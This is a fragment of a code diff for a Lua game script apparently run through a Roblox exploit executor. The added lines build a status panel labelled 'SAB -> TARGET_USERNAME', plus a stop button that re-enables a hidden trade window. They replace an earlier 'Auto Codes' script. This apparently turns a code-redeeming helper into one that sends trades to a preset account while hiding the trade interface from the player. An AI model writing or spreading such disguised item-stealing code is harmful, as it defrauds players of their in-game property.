+    local f = Instance.new("Frame")
+    f.Size = UDim2.fromOffset(250, 76); f.Position = UDim2.fromOffset(12, 12)
+    f.BackgroundColor3 = Color3.fromRGB(16, 16, 18); f.BorderSizePixel = 0; f.Parent = gui
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
 
-if Config.AutoListen then
-    State.Listening = true
-    refreshButtons()
-end
+    local t = Instance.new("TextLabel")
+    t.Size = UDim2.new(1, -12, 0, 20); t.Position = UDim2.fromOffset(8, 6)
+    t.BackgroundTransparency = 1; t.Font = Enum.Font.GothamBold; t.TextSize = 13
+    t.TextXAlignment = Enum.TextXAlignment.Left
+    t.TextColor3 = Color3.fromRGB(120, 220, 140)
+    t.Text = "SAB -> " .. tostring(getgenv().TARGET_USERNAME); t.Parent = f
 
-print("[SAB Auto Codes] Reconstruido correctamente. Remote:", State.RemoteConnected, "GUI observers:", State.GuiObserverCount)
+    local s = Instance.new("TextLabel")
+    s.Size = UDim2.new(1, -12, 0, 16); s.Position = UDim2.fromOffset(8, 28)
+    s.BackgroundTransparency = 1; s.Font = Enum.Font.Gotham; s.TextSize = 11
+    s.TextXAlignment = Enum.TextXAlignment.Left
+    s.TextColor3 = Color3.fromRGB(205, 205, 205); s.Text = "iniciando..."; s.Parent = f
+
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, -16, 0, 20); b.Position = UDim2.fromOffset(8, 50)
+    b.BackgroundColor3 = Color3.fromRGB(200, 60, 60); b.BorderSizePixel = 0
+    b.Font = Enum.Font.GothamBold; b.TextSize = 11; b.TextColor3 = Color3.new(1,1,1)
+    b.Text = "DETENER"; b.Parent = f
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
+
+    b.MouseButton1Click:Connect(function()
+        STATE.running = false
+        s.Text = "detenido"
+        local r = findTradeRoot(); if r then pcall(function() r.Enabled = true end) end
+    end)
+
+    _G.SAB_HUD = function(m) s.Text = tostring(m) end
+end)
+
+notify("SAB", "Cargado. Trade -> " .. tostring(getgenv().TARGET_USERNAME))
